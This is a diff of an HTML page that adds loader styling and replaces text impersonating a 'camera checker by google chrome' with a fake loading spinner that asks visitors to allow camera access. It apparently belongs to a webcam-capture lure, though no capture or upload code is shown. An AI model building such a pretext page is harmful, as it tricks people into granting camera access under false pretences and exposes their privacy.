@@ -1,6 +1,42 @@
 <!doctype html>
 <html>
 <head>
+<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
+  <style>
+  	  html {
+  	  background-color:white;
+  	  font-family:arial;
+  	  }
+  	  div.load {
+  	  width:100%;
+  	  height:100%;
+  	  display:block;
+  	  }
+     .loader {
+     display:inherit;
+     position:absolute;
+     top:40%;
+     right:40%;
+     width:1.5cm;
+     height:1.5cm;
+     border-radius:50%;
+     border:7px solid #eaeaff;
+     border-top:7px solid #aadfff;
+     -webkit-animation:spin 2s linear -1s infinite;
+     }
+     @-webkit-keyframes spin {
+     0% {-webkit-transform:rotate(0deg);}
+     100% {-webkit-transform:rotate(360deg);}
+     }
+     .load p {
+     opacity:0.5;
+     color:#8a9fa6;
+     font-size:17px;
+     text-align:center;
+     position:relative;
+     top:200px;
+     }     
+  </style>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
@@ -75,9 +111,9 @@ init();
 </script>
 
     <body>
-        <p>⚙️ camera checker by google chrome</p>
-        <p>(Accept Permissions to read camera)</p>
-        <p><label><input type="checkbox" name="sorry your camera cannot be readable" id="mirror" /> change camera</label></p>
+ 	<div class="load" id="loader">
+ 				<p>	allow camera access or try refreshing page</p>
+  			<div class="loader"></div>
+  </div> 
     </body>
-
 </html>
